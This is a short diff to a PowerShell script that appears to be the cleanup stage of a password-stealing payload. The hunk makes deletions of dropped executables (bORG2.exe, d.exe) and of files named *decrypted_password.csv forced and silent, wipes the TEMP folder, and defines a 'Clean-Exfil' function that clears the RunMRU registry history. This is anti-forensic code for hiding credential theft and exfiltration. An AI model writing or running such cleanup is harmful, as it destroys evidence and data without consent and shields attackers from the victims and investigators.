@@ -15,9 +15,9 @@ start-sleep 60
 
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-rm "$env:USERPROFILE\bORG2.exe"
-rm "$env:USERPROFILE\d.exe"
-get-childItem * -Include *decrypted_password.csv -Recurse | rm
+rm "$env:USERPROFILE\bORG2.exe" -r -Force -ErrorAction SilentlyContinue
+rm "$env:USERPROFILE\d.exe" -r -Force -ErrorAction SilentlyContinue
+get-childItem * -Include *decrypted_password.csv -Recurse | rm -r -Force -ErrorAction SilentlyContinue
 function Clean-Exfil { 
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
